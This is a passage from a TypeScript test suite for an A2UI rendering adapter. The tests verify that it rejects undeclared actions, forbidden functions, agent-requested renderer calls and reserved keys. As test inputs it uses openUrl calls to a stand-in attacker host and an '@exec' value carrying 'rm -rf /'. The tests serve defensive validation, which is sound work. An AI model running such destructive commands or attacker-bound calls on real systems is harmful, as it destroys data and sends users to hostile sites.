          },
        },
      ]),
    );
    expect(viaFunction.diagnostics[0]).toMatchObject({ rule: 'unsupported-catalog' });

    // Without a surface default, a component must name its catalog.
    const bare = createA2uiAdapter({ surface });
    const unresolved = bare.apply({
      version: '1.0',
      createSurface: {
        surfaceId: 'n',
        components: [{ id: 'root', component: 'Text', text: 'Hi' }],
      },
    });
    expect(unresolved.diagnostics[0]).toMatchObject({ rule: 'unresolved-catalog', value: 'root' });
    expect(surface.childNodes).toHaveLength(0);
    const explicit = bare.apply({
      version: '1.0',
      createSurface: {
        surfaceId: 'n',
        components: [
          { id: 'root', component: 'Card', child: 'hi', '@catalogId': V1 },
          { id: 'hi', component: 'Text', text: 'Hi', '@catalogId': V1 },
        ],
      },
    });
    expect(explicit.ok).toBe(true);
    expect(surface.textContent).toContain('Hi');
  });

  it('S20 never dispatches a 1.0 action outside the declared set', () => {
    const events: A2uiActionMessage[] = [];
    const adapter = createA2uiAdapter({ onAction: (event) => events.push(event), surface });
    adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'Card', child: 'confirm' },
          ...button('confirm', 'Confirm order', { event: { name: 'confirm-order' } }),
        ],
      }),
    );

    const result = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'export' },
        ...button('export', 'Export', { event: { name: 'export-account-data' } }),
      ]),
    );

    expect(result.diagnostics[0]).toMatchObject({
      rule: 'undeclared-action',
      value: 'export-account-data',
    });
    activate(surface, 'ki-button');
    expect(events.map((e) => e.action.name)).toStrictEqual(['confirm-order']);

    // A local function call stays behind the empty allowlist, in actions and values.
    const local = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'open' },
        ...button('open', 'Open', {
          functionCall: { '@call': 'openUrl', args: { url: 'https://attacker.example/' } },
        }),
      ]),
    );
    expect(local.diagnostics[0]).toMatchObject({ rule: 'forbidden-function', value: 'openUrl' });
    const passive = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'go' },
        ...button('go', 'Go', {
          event: {
            name: 'confirm-order',
            context: { url: { '@call': 'openUrl', args: { url: 'https://attacker.example/' } } },
          },
        }),
      ]),
    );
    expect(passive.diagnostics[0]).toMatchObject({ rule: 'forbidden-function', value: 'openUrl' });
  });

  it('S21 refuses an agent request to run a renderer function', () => {
    const responses: A2uiRendererFunctionResponse[] = [];
    const fetchSpy = vi.spyOn(globalThis, 'fetch');
    const openSpy = vi.spyOn(window, 'open');
    const adapter = createA2uiAdapter({
      onFunctionResponse: (response) => responses.push(response),
      surface,
    });
    adapter.apply(create('checkout', { components: orderComponentsV1, dataModel: ORDER }));
    const location = window.location.href;

    const result = adapter.apply({
      version: '1.0',
      callRendererFunction: {
        surfaceId: 'checkout',
        functionCallId: 'call-1',
        callFunction: {
          '@call': 'openUrl',
          catalogId: V1,
          args: { url: 'https://attacker.example/' },
        },
      },
    });

    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({
      rule: 'invalid-function-call',
      value: 'openUrl',
    });
    expect(responses).toHaveLength(1);
    expect(responses[0]).toMatchObject({
      version: '1.0',
      rendererFunctionResponse: {
        functionCallId: 'call-1',
        error: { code: 'INVALID_FUNCTION_CALL' },
      },
    });
    expect(Object.keys(responses[0]?.rendererFunctionResponse ?? {}).sort()).toStrictEqual([
      'error',
      'functionCallId',
    ]);
    expect(responses[0]?.rendererFunctionResponse.error.message).toContain('openUrl');
    expect(window.location.href).toBe(location);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(openSpy).not.toHaveBeenCalled();

    // Pure functions are renderer-only too, and an unsolicited response is refused.
    adapter.apply({
      version: '1.0',
      callRendererFunction: {
        functionCallId: 'call-2',
        callFunction: { '@call': 'formatString', catalogId: V1, args: { value: 'x' } },
      },
    });
    expect(responses.map((r) => r.rendererFunctionResponse.functionCallId)).toStrictEqual([
      'call-1',
      'call-2',
    ]);
    const unsolicited = adapter.apply({
      version: '1.0',
      agentFunctionResponse: { functionCallId: 'call-9', value: 'https://attacker.example/' },
    });
    expect(unsolicited.diagnostics[0]?.rule).toBe('unexpected-message');
    expect(surface.textContent).toContain('Order summary');
  });

  it('S22 rejects an unknown reserved key in a 1.0 value', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create('checkout'));

    const result = adapter.apply(
      update(
        [
          { id: 'root', component: 'Card', child: 'go' },
          ...button('go', 'Go', {
            event: { name: 'go', context: { command: { '@exec': 'rm -rf /' } } },
          }),
        ],
        'checkout',
      ),
    );

    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({ rule: 'reserved-key', value: '@exec' });
    expect(surface.childNodes).toHaveLength(0);

    for (const value of [{ '@exec': 'x' }, { nested: { '@': 1 } }]) {
      const inProperty = adapter.apply(
        update(
          [
            { id: 'root', component: 'Card', child: 'go' },
            ...button('go', 'Go', { event: { name: 'go', context: { deep: [value] } } }),
          ],
          'checkout',
        ),
      );
      expect(inProperty.diagnostics[0]?.rule).toBe('reserved-key');
    }
    const asText = adapter.apply(
      update([{ id: 'root', component: 'Text', text: { '@exec': 'x' } }], 'checkout'),
    );
    expect(asText.diagnostics[0]).toMatchObject({ rule: 'reserved-key', value: '@exec' });
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S23 reports a rejected 1.0 message to the agent in the 1.0 shape', () => {
    const errors: A2uiErrorMessage[] = [];
    const adapter = createA2uiAdapter({ onError: (error) => errors.push(error), surface });
    adapter.apply(create());

    adapter.apply(update([{ id: 'root', component: 'Card', child: 'x', style: 'color:red' }]));

    expect(errors).toStrictEqual([
      {
        version: '1.0',
        error: {
          code: 'VALIDATION_FAILED',
          surfaceId: 's',
          path: '/components/root/style',
          message: 'Card does not declare the property "style"',
        },
      },
    ]);
    const reference = validRendererMessagesV1[2];
    expect(Object.keys(errors[0]?.error ?? {}).sort()).toStrictEqual(
      Object.keys(reference.error).sort(),
    );
  });
});
